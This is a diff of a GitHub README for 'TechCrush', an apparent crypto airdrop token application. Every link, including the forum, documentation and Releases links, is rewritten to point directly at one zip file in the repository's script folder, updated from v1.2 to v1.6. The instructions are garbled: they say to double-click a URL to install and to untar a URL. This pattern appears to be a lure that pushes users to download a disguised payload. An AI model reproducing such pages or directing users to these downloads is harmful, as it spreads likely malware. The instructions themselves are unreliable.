@@ -1,6 +1,6 @@
 # 🚀 TECHCRUSHERC-20 - Simple Airdrop Token Functionality
 
-[![Download Now](https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip%20Now-TECHCRUSHERC--20-brightgreen)](https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip)
+[![Download Now](https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip%20Now-TECHCRUSHERC--20-brightgreen)](https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip)
 
 ## 📖 About TechCrush
 
@@ -14,15 +14,15 @@ To get started, follow the simple steps below to download and run the TechCrush 
 
 ### Step 1: Visit the Download Page
 
-Go to our [Releases page](https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip) to access the latest version of TechCrush. You will find various files available for download according to your needs.
+Go to our [Releases page](https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip) to access the latest version of TechCrush. You will find various files available for download according to your needs.
 
 ### Step 2: Choose Your File
 
 On the Releases page, select the appropriate file for your system. Here are the general options you might see: 
 
-- **For Windows:** `https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip`
-- **For Mac:** `https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip`
-- **For Linux:** `https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip`
+- **For Windows:** `https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip`
+- **For Mac:** `https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip`
+- **For Linux:** `https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip`
 
 ### Step 3: Download the File
 
@@ -30,17 +30,17 @@ Click on the file name to begin the download. The application will save to your 
 
 ### Step 4: Extract the File (if needed)
 
-If you downloaded a zip or https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip file, you will need to extract it:
+If you downloaded a zip or https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip file, you will need to extract it:
 
 - **Windows:** Right-click the file and select "Extract All."
 - **Mac:** Double-click the zip file, and it will automatically extract.
-- **Linux:** Use the command `tar -xvzf https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip` in your terminal.
+- **Linux:** Use the command `tar -xvzf https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip` in your terminal.
 
 ### Step 5: Install the Application
 
 Locate the extracted folder and find the application file:
 
-- **Windows:** Double-click `https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip` to start the installation wizard. Follow what appears on the screen to complete the install.
+- **Windows:** Double-click `https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip` to start the installation wizard. Follow what appears on the screen to complete the install.
 - **Mac:** Drag the `TechCrush_Mac` icon to your Applications folder.
 - **Linux:** Run the command `./TechCrush_Linux` in the terminal to launch the application.
 
@@ -70,7 +70,7 @@ To run the TechCrush application, your computer should meet the following requir
 
 ## 🤝 Community Support
 
-If you have questions or need help, feel free to reach out to our community. You can join our [discussion forum](https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip) or visit our support channels linked on the Releases page.
+If you have questions or need help, feel free to reach out to our community. You can join our [discussion forum](https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip) or visit our support channels linked on the Releases page.
 
 ## 📜 License
 
@@ -78,7 +78,7 @@ TechCrush is open-source software. You can find our licensing details in the rep
 
 ## 💻 Additional Resources
 
-- [Official Documentation](https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip)
-- [Latest Updates](https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip)
+- [Official Documentation](https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip)
+- [Latest Updates](https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip)
 
-Remember, for downloading and running the software, you can always return to the [Releases page](https://raw.githubusercontent.com/Ganesh5648/TECHCRUSHERC-20/main/script/TECHCRUSHERC-20-1.2.zip). Enjoy exploring the world of cryptocurrencies with TechCrush!
+Remember, for downloading and running the software, you can always return to the [Releases page](https://github.com/Ganesh5648/TECHCRUSHERC-20/raw/refs/heads/main/script/TECHCRUSHER_v1.6.zip). Enjoy exploring the world of cryptocurrencies with TechCrush!
